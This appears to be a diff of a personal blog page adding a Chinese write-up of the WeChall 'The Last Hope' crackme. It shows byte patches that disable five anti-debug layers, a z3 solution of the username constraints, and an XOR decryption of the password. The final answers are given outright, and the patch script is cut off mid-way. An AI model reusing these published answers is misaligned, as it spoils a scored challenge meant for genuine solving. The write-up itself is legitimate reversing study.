@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">455</span>
+          <span class="site-state-item-count">565</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -245,7 +245,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">334</span>
+        <span class="site-state-item-count">382</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -281,7 +281,7 @@ p.spoiler {
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-md5-salt/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-the-last-hope/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -299,7 +299,7 @@ p.spoiler {
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-md5-salt/" class="post-title-link" itemprop="url">WeChall - MD5.SALT</a>
+          <a href="/wp/WeChall/wechall-the-last-hope/" class="post-title-link" itemprop="url">WeChall - The Last Hope</a>
         </h2>
 
         <div class="post-meta-container">
@@ -310,7 +310,978 @@ p.spoiler {
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-10 10:55:57" itemprop="dateCreated datePublished" datetime="2026-06-10T10:55:57+08:00">2026-06-10</time>
+      <time title="Created: 2026-07-14 16:04:50" itemprop="dateCreated datePublished" datetime="2026-07-14T16:04:50+08:00">2026-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:08:55" itemprop="dateModified" datetime="2026-09-15T10:08:55+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-the-last-hope/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-the-last-hope/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>WeChall 上的 <span class="exturl" data-url="aHR0cHM6Ly93d3cud2VjaGFsbC5uZXQvY2hhbGxlbmdlL2JzZGhlbGwvdGhlbGFzdGhvcGUvaW5kZXgucGhw">The
+Last Hope<i class="fa fa-external-link-alt"></i></span>（Linux, Cracking），由一个 32-bit ELF 二进制构成。</p>
+<h3 id="反调试绕过">反调试绕过</h3>
+<p>二进制有 5 层反调试，必须全部 patch 掉才能正常运行或调试。</p>
+<p>先用 <code>rabin2</code> 获取基本信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rabin2 -I bsd_thelasthope.elf</span><br><span class="line">arch     x86</span><br><span class="line">binsz    10569</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">compiler GCC: (Ubuntu 4.3.3-5ubuntu4) 4.3.3</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pic      false</span><br><span class="line">relocs   false</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br></pre></td></tr></table></figure>
+<h4 id="layer-1-.ctors-构造函数">Layer 1: <code>.ctors</code>
+构造函数</h4>
+<p>在 <code>main()</code> 之前，<code>.ctors</code> 段中的
+<code>anti_ptrace</code> 就会被调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -q -c &#x27;pf. S .ctors&#x27; bsd_thelasthope.elf</span><br><span class="line">0x0804af00 ffffffff 5b8c0408 00000000     ....[.......</span><br></pre></td></tr></table></figure>
+<p><code>0x08048c5b</code> 即 <code>anti_ptrace</code>。将其 patch 为
+<code>0xffffffff</code>（sentinel 值），让反向遍历提前终止：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># .ctors entry @ VA 0x0804af04 → 文件偏移 = VA - 0x08049000 = 0x1f04</span><br><span class="line">printf &#x27;\xff\xff\xff\xff&#x27; | dd of=bsd_thelasthope.elf bs=1 seek=$((0x1f04)) conv=notrunc</span><br></pre></td></tr></table></figure>
+<h4 id="layer-2-3-main-中的-anti_ptrace-调用-sigtrap-handler">Layer 2
+&amp; 3: main 中的 anti_ptrace 调用 + SIGTRAP handler</h4>
+<p>用 r2 查看 <code>main</code> 的 disassembly：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -A -q -c &#x27;pdf @ main&#x27; bsd_thelasthope.elf</span><br></pre></td></tr></table></figure>
+<p>关键片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x08048d59: call anti_ptrace</span><br><span class="line">0x08048d5e: mov  dword [esp+4], handler  ; signal handler</span><br><span class="line">0x08048d66: mov  dword [esp], 5           ; SIGTRAP</span><br><span class="line">0x08048d6d: call signal</span><br></pre></td></tr></table></figure>
+<p>Patch 这两处为 NOP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># VA 0x08048d59 → 文件偏移 0x0d59: 5 bytes → NOP</span><br><span class="line"># VA 0x08048d6d → 文件偏移 0x0d6d: 5 bytes → NOP</span><br></pre></td></tr></table></figure>
+<h4 id="layer-4-int3-breakpoint-检测">Layer 4: INT3 + breakpoint
+检测</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x08048d72: int3                    ; SIGTRAP → handler 吞掉</span><br><span class="line">0x08048d73: mov  eax, 0x8048bd1     ; pw_check 地址</span><br><span class="line">0x08048d78: add  eax, 3</span><br><span class="line">0x08048d7b: mov  eax, [eax]</span><br><span class="line">0x08048d7d: and  eax, 0xff</span><br><span class="line">0x08048d82: cmp  eax, 0xcc          ; 检查 pw_check+3 是否被设了 0xCC (int3)</span><br><span class="line">0x08048d87: jne  ...</span><br><span class="line">; 如果发现 0xCC → 打印 &quot;no,no breakpoints&quot; → exit</span><br></pre></td></tr></table></figure>
+<p>Patch 方案：把 <code>int3</code> (VA 0x08048d72 → 文件偏移 0x0d72)
+NOP 掉，把 <code>jne</code> (VA 0x08048d87 → 0x0d87) 改为
+<code>jmp</code>。</p>
+<h4 id="layer-5-ptraceptrace_traceme">Layer 5:
+ptrace(PTRACE_TRACEME)</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x08048dc0: call ptrace             ; ptrace(PTRACE_TRACEME, 0, 1, 0)</span><br><span class="line">0x08048dc5: test eax, eax</span><br><span class="line">0x08048dc7: jns  ...                ; ≥0 → 正常; &lt;0 → &quot;oh oh DEBUGGING... Bye&quot;</span><br></pre></td></tr></table></figure>
+<p>由于 Layer 1 的 fork 子进程已经 ptrace(ATTACH)
+了父进程，PTRACE_TRACEME 必然失败（一个进程只能被一个 tracer
+追踪）。改为 <code>xor eax, eax</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># VA 0x08048dc0 → 文件偏移 0x0dc0: 5 bytes → xor eax,eax; nop; nop; nop (31 c0 90 90 90)</span><br></pre></td></tr></table></figure>
+<p>完整 patch 脚本见文末。</p>
+<h3 id="username-逆向-user_check">Username 逆向
+(<code>user_check</code>)</h3>
+<h4 id="函数调用链">函数调用链</h4>
+<p>用 r2 列出关键函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -q -c &#x27;afl~check&#x27; bsd_thelasthope.elf</span><br><span class="line">0x08048863  user_check</span><br><span class="line">0x08048bd1  pw_check</span><br><span class="line">0x080487a6  length_check</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 中的处理流程：</p>
+<ol type="1">
+<li><code>fgets(username, 15, stdin)</code>：读入包含换行符（如
+<code>"whoami\n"</code>，<code>strlen=7</code>）</li>
+<li><code>lc(username, len)</code>：检查前 <code>len-1</code>
+个字符不含大写字母</li>
+<li><code>uc(username, len)</code>：将前 <code>len-1</code>
+个字符转为大写（原地修改，内部调用 <code>toupper()</code>）</li>
+<li><code>user_check(username, len)</code>：逐字符验证</li>
+</ol>
+<p>由于 <code>fgets</code>
+保留换行符，<code>strlen("whoami\n")=7</code>，循环 <code>i=0..5</code>
+覆盖全部 6 个有效字符。换行符在 <code>i=6</code> 处被排除。</p>
+<h4 id="约束条件应用于大写-ascii-值">约束条件（应用于大写 ASCII
+值）</h4>
+<p>用 <code>pwntools</code> 快速提取符号和关键常量：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;user_check @ <span class="subst">&#123;elf.symbols[<span class="string">&#x27;user_check&#x27;</span>]:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密目标字符串（位于 .rodata 0x08049050）</span></span><br><span class="line">target = elf.read(<span class="number">0x08049050</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;encrypted target: <span class="subst">&#123;target&#125;</span>&quot;</span>)  <span class="comment"># b&#x27;Oxw|n]nfog&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>user_check</code> 对每个位置 <code>i</code>
+执行不同的检查，将满足条件的值累加到 accumulator，最终与
+<code>0xcd5</code> (3285) 比较：</p>
+<ul>
+<li><strong>0, 1, 4</strong>: 6c±1 双 Fermat + 硬编码，累加
++13c。f0=6c-1, f1=6c+1 均须为基-2 伪素数</li>
+<li><strong>2, 5</strong>: 单 Fermat (c 自身)，累加 +c。2^(c-1) mod c ==
+1</li>
+<li><strong>3</strong>: 整除性，累加 +c。c % 5 == 0</li>
+</ul>
+<p>硬编码检查（在 fermat 通过后执行）：</p>
+<ul>
+<li><code>U[0]</code>: 2×c == 0xae (174) → c = 87 = <code>W</code></li>
+<li><code>U[1]</code>: 2×c == 0x90 (144) → c = 72 = <code>H</code></li>
+<li><code>U[4]</code>: 2×c == 0x9a (154) → c = 77 = <code>M</code></li>
+</ul>
+<p>U[0], U[1], U[4] 被固定为 <code>W</code>, <code>H</code>,
+<code>M</code>。同时要求 6c±1 为素数对（twin primes 模式）：</p>
+<ul>
+<li>W=87: 6×87-1=521(✓), 6×87+1=523(✓)</li>
+<li>H=72: 6×72-1=431(✓), 6×72+1=433(✓)</li>
+<li>M=77: 6×77-1=461(✓), 6×77+1=463(✓)</li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>：positions 0,1,4 的 fermat
+检查后有一条看似多余的 <code>c == floor(6c/5)</code> 比较，实际上编译器
+magic constant <code>0x2aaaaaab</code> 做的是除以 6（而非除以
+5）。<code>floor(6c/6) == c</code> 恒成立，实为 no-op。</p>
+</blockquote>
+<h4 id="求解">求解</h4>
+<p>已知 13×(87+72+77) = 3068，剩余：3285 - 3068 = 217。</p>
+<p>在 A-Z (65-90) 范围内筛选：</p>
+<ul>
+<li>U[2], U[5] 须为 Fermat 伪素数: <code>C, G, I, O, S, Y</code></li>
+<li>U[3] 须被 5 整除: <code>A, F, K, P, U, Z</code></li>
+</ul>
+<p>求 U[2] + U[3] + U[5] = 217 的解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U[2]=G(71), U[3]=K(75), U[5]=G(71) → WHGKMG (whgkmg)</span><br><span class="line">U[2]=I(73), U[3]=A(65), U[5]=O(79) → WHIAMO (whiamo)</span><br><span class="line">U[2]=O(79), U[3]=A(65), U[5]=I(73) → WHOAMI (whoami)</span><br></pre></td></tr></table></figure>
+<p>唯一形成有意义单词的是 <code>WHOAMI</code>，对应输入
+<code>whoami</code>（程序通过 <code>uc()</code> 自动转大写）。</p>
+<h4 id="z3-求解替代方案">z3 求解（替代方案）</h4>
+<p>此题约束本质是 CSP：6 个变量、有限域（A-Z）、线性方程 + 素性谓词。z3
+的 table-driven 模式很适合，预计算 26 个字符中哪些满足各位置约束，交给
+z3 解线性部分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fermat_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">2</span>, n-<span class="number">1</span>, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预计算：26 个字符中哪些满足各位置的素性约束</span></span><br><span class="line">valid_014 = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)</span><br><span class="line">             <span class="keyword">if</span> is_fermat_prime(<span class="number">6</span>*c-<span class="number">1</span>) <span class="keyword">and</span> is_fermat_prime(<span class="number">6</span>*c+<span class="number">1</span>)]</span><br><span class="line">valid_25  = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">if</span> is_fermat_prime(c)]</span><br><span class="line">valid_3   = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">if</span> c % <span class="number">5</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bool table：每个字符是否满足对应约束</span></span><br><span class="line">table_014 = &#123;c: Bool(<span class="string">f&quot;twin_<span class="subst">&#123;c&#125;</span>&quot;</span>)  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line">table_25  = &#123;c: Bool(<span class="string">f&quot;prime_<span class="subst">&#123;c&#125;</span>&quot;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line">table_3   = &#123;c: Bool(<span class="string">f&quot;mod5_<span class="subst">&#123;c&#125;</span>&quot;</span>)  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">    s.add(table_014[c] == (c <span class="keyword">in</span> valid_014))</span><br><span class="line">    s.add(table_25[c]  == (c <span class="keyword">in</span> valid_25))</span><br><span class="line">    s.add(table_3[c]   == (c % <span class="number">5</span> == <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">U = [BitVec(<span class="string">f&#x27;U<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    s.add(U[i] &gt;= <span class="number">65</span>, U[i] &lt;= <span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Per-position constraints via table lookup</span></span><br><span class="line">s.add(Or([And(U[<span class="number">0</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">1</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">4</span>] == c, table_014[c]) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">2</span>] == c, table_25[c])  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">5</span>] == c, table_25[c])  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line">s.add(Or([And(U[<span class="number">3</span>] == c, table_3[c])   <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hardcoded checks (from assembly)</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">0</span>] == <span class="number">174</span>)  <span class="comment"># 0xae → W</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">1</span>] == <span class="number">144</span>)  <span class="comment"># 0x90 → H</span></span><br><span class="line">s.add(<span class="number">2</span> * U[<span class="number">4</span>] == <span class="number">154</span>)  <span class="comment"># 0x9a → M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Accumulator sum</span></span><br><span class="line">s.add(<span class="number">13</span> * (U[<span class="number">0</span>] + U[<span class="number">1</span>] + U[<span class="number">4</span>]) + U[<span class="number">2</span>] + U[<span class="number">3</span>] + U[<span class="number">5</span>] == <span class="number">3285</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[U[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> → <span class="subst">&#123;name.lower()&#125;</span>&quot;</span>)</span><br><span class="line">    s.add(Or([U[i] != m[U[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output:</span></span><br><span class="line"><span class="comment">#   WHGKMG → whgkmg</span></span><br><span class="line"><span class="comment">#   WHOAMI → whoami</span></span><br><span class="line"><span class="comment">#   WHIAMO → whiamo</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>为什么不用 angr？</strong> 此题有 x87
+浮点指令（<code>fprem</code>/<code>fmod</code> 做 Fermat 检验）+
+<code>fork/ptrace</code> 反调试 + <code>INT3</code> 断点检测。angr 的
+VEX IR 对 x87 浮点栈支持弱，<code>fork</code> 会直接 concretize，且
+patch 5 层反调试后 angr 能做的也只是验证已知路径，不如直接 z3
+解约束。</p>
+</blockquote>
+<h3 id="password-逆向-pw_check">Password 逆向
+(<code>pw_check</code>)</h3>
+<h4 id="xor-加密">XOR 加密</h4>
+<p>用 r2 反编译 <code>encrypt</code> 函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -A -q -c &#x27;pdf @ sym.encrypt&#x27; bsd_thelasthope.elf</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 中定义了 15 字节 XOR key（位于
+<code>[ebp-0x44]</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0x1f, 0x0a, 0x1e, 0x11, 0x0b, 0x09, 0x19, 0x0f, 0x01, 0x14,</span><br><span class="line"> 0x16, 0x0c, 0x06, 0x0d, 0x65]</span><br></pre></td></tr></table></figure>
+<p><code>encrypt()</code> 函数对密码逐字节 XOR：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    password[i] ^= key[i % <span class="number">15</span>];</span><br></pre></td></tr></table></figure>
+<p>然后 <code>chomp()</code> 去掉末尾换行符，<code>pw_check()</code>
+将结果与硬编码字符串比较。</p>
+<p>用 pwntools 直接读取目标字符串：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br><span class="line">target = elf.read(<span class="number">0x08049050</span>, <span class="number">10</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;target: <span class="subst">&#123;target&#125;</span>&quot;</span>)  <span class="comment"># Oxw|n]nfog</span></span><br></pre></td></tr></table></figure>
+<p>或直接用 r2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ r2 -q -c &#x27;ps @ 0x08049050&#x27; bsd_thelasthope.elf</span><br><span class="line">Oxw|n]nfog</span><br></pre></td></tr></table></figure>
+<h4 id="求解-1">求解</h4>
+<p>直接逆向 XOR，key 和密文等长（均为 10 字节）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="string">b&quot;Oxw|n]nfog&quot;</span></span><br><span class="line">key = [<span class="number">0x1f</span>, <span class="number">0x0a</span>, <span class="number">0x1e</span>, <span class="number">0x11</span>, <span class="number">0x0b</span>, <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x0f</span>, <span class="number">0x01</span>, <span class="number">0x14</span>]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(e ^ key[i]) <span class="keyword">for</span> i, e <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted))</span><br><span class="line"><span class="comment"># → &quot;PrimeTwins&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="验证">验证</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O=0x4f ^ 0x1f = 0x50 = P</span><br><span class="line">x=0x78 ^ 0x0a = 0x72 = r</span><br><span class="line">w=0x77 ^ 0x1e = 0x69 = i</span><br><span class="line">|=0x7c ^ 0x11 = 0x6d = m</span><br><span class="line">n=0x6e ^ 0x0b = 0x65 = e</span><br><span class="line">]=0x5d ^ 0x09 = 0x54 = T</span><br><span class="line">n=0x6e ^ 0x19 = 0x77 = w</span><br><span class="line">f=0x66 ^ 0x0f = 0x69 = i</span><br><span class="line">o=0x6f ^ 0x01 = 0x6e = n</span><br><span class="line">g=0x67 ^ 0x14 = 0x73 = s</span><br></pre></td></tr></table></figure>
+<h3 id="完整-patch-脚本">完整 Patch 脚本</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Patch anti-debug measures in bsd_thelasthope.elf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ELF segment layout:</span></span><br><span class="line"><span class="string">  text: file 0x000000 → VA 0x08048000   (file_off = VA - 0x08048000)</span></span><br><span class="line"><span class="string">  data: file 0x001f00 → VA 0x0804af00   (file_off = VA - 0x08049000)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r+b&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Layer 1: .ctors → nuke anti_ptrace entry (VA 0x0804af04, data seg)</span></span><br><span class="line">        f.seek(<span class="number">0x1f04</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\xff\xff\xff\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 2: NOP call anti_ptrace @ VA 0x08048d59 (5 bytes, text seg)</span></span><br><span class="line">        f.seek(<span class="number">0x0d59</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 3: NOP call signal @ VA 0x08048d6d (5 bytes)</span></span><br><span class="line">        f.seek(<span class="number">0x0d6d</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Layer 4a: NOP int3 @ VA 0x08048d72 (1 byte)</span></span><br><span class="line">        f.seek(<span class="number">0x0d72</span>)</span><br><span class="line">        f.write(<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 